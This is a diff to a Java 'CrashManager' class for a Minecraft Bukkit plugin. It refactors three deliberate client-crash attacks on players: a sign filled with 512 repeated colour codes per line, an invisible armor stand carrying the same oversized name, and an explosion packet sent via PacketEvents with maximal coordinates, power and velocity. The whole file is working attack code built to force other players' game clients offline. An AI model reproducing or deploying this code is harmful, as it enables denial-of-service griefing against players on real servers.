@@ -5,17 +5,19 @@ import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.World;
 import org.bukkit.block.Block;
+import org.bukkit.block.BlockState;
 import org.bukkit.block.Sign;
 import org.bukkit.entity.ArmorStand;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
+import org.bukkit.plugin.Plugin;
 
 import com.github.retrooper.packetevents.PacketEvents;
 import com.github.retrooper.packetevents.util.Vector3d;
 import com.github.retrooper.packetevents.util.Vector3f;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
 
-import java.util.ArrayList;
+import java.util.Collections;
 
 public class CrashManager {
 
@@ -25,66 +27,66 @@ public class CrashManager {
         PAYLOAD
     }
 
-    private final WrapperPlayServerExplosion crashPacket;
+    private static final String CRASH_STRING = "§c".repeat(512);
+    private static final String[] SIGN_LINES = {CRASH_STRING, CRASH_STRING, CRASH_STRING, CRASH_STRING};
+    private static final Vector3d MAX_VECTOR_3D = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
+    private static final Vector3f MAX_VECTOR_3F = new Vector3f(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE);
+    private static final WrapperPlayServerExplosion CRASH_PACKET = new WrapperPlayServerExplosion(
+            MAX_VECTOR_3D,
+            Float.MAX_VALUE,
+            Collections.emptyList(),
+            MAX_VECTOR_3F
+    );
 
-    public CrashManager() {
-        crashPacket = new WrapperPlayServerExplosion(
-                new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
-                Float.MAX_VALUE,
-                new ArrayList<>(),
-                new Vector3f(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE)
-        );
+    private final Plugin plugin;
+
+    public CrashManager(Plugin plugin) {
+        this.plugin = plugin;
     }
 
     public void crashWithSign(Player player) {
-        Location loc = player.getLocation().clone();
+        Location loc = player.getLocation();
         Block block = loc.getBlock();
         
+        if (!block.getType().isAir()) return;
+        
         block.setType(Material.OAK_SIGN, false);
+        player.sendSignChange(block.getLocation(), SIGN_LINES);
         
-        String crashLine = "§c".repeat(512);
-        if (block.getState() instanceof Sign) {
-            Sign sign = (Sign) block.getState();
-            for (int i = 0; i < 4; i++) sign.setLine(i, crashLine);
-            sign.update();
+        BlockState state = block.getState();
+        if (state instanceof Sign) {
+            Sign sign = (Sign) state;
+            
+            for (int i = 0; i < 4; i++) {
+                sign.setLine(i, CRASH_STRING);
+            }
+            
+            sign.update(true, false);
         }
-        
-        player.sendSignChange(block.getLocation(), new String[] {
-            crashLine,
-            crashLine,
-            crashLine,
-            crashLine
-        });
     }
 
     public void crashWithArmorStand(Player player) {
-        Location loc = player.getLocation().clone();
-        String crashName = "§c".repeat(512);
+        Location loc = player.getLocation();
         World world = player.getWorld();
         ArmorStand stand = (ArmorStand) world.spawnEntity(loc, EntityType.ARMOR_STAND);
         
         stand.setInvisible(true);
-        stand.setCustomName(crashName);
+        stand.setCustomName(CRASH_STRING);
         stand.setCustomNameVisible(true);
         stand.setMarker(true);
-        Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugins()[0], stand::remove, 20L);
+        
+        Bukkit.getScheduler().runTaskLater(plugin, stand::remove, 20L);
     }
 
-    public void crashWithPayload(Player bukkitPlayer) {
-        PacketEvents.getAPI().getPlayerManager().sendPacket(bukkitPlayer, crashPacket);
+    public void crashWithPayload(Player player) {
+        PacketEvents.getAPI().getPlayerManager().sendPacket(player, CRASH_PACKET);
     }
 
     public void crashPlayer(Player player, CrashType type) {
         switch (type) {
-            case SIGN:
-                crashWithSign(player);
-                break;
-            case ENTITY:
-                crashWithArmorStand(player);
-                break;
-            case PAYLOAD:
-                crashWithPayload(player);
-                break;
+            case SIGN -> crashWithSign(player);
+            case ENTITY -> crashWithArmorStand(player);
+            case PAYLOAD -> crashWithPayload(player);
         }
     }
 }
